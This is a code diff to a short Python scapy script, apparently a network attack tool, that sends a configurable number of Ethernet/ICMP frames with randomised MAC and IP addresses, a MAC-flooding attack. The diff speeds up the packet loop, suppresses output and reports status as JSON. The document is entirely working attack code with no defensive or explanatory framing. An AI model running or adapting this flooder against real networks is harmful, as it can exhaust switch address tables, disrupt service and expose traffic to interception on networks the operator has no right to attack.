@@ -3,7 +3,7 @@
 DATE:   2021/11/22
 AUTHOR: TesterCC
 """
-
+import json
 import optparse
 
 from scapy.all import *
@@ -18,15 +18,19 @@ ret['status'] = None
 def start_attack(count):
     for i in range(count):
         packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP()) / ICMP()
-        time.sleep(0.5)
-        sendp(packet)
+        time.sleep(0.3)
+        sendp(packet, verbose=False)
         # print(packet.summary())
+    ret['status'] = 'success'
 
 
-if __name__ == '__main__':
+def main():
     parser = optparse.OptionParser('usage: python %prog --count 200 \n')
     parser.add_option('-c', '--count', dest='attack_count', default='100', type='string', help='send packet count')
     options, args = parser.parse_args()
-    # print(options.attack_count)
     start_attack(int(options.attack_count))
-    print(ret)
+    print(json.dumps(ret))
+
+
+if __name__ == '__main__':
+    main()
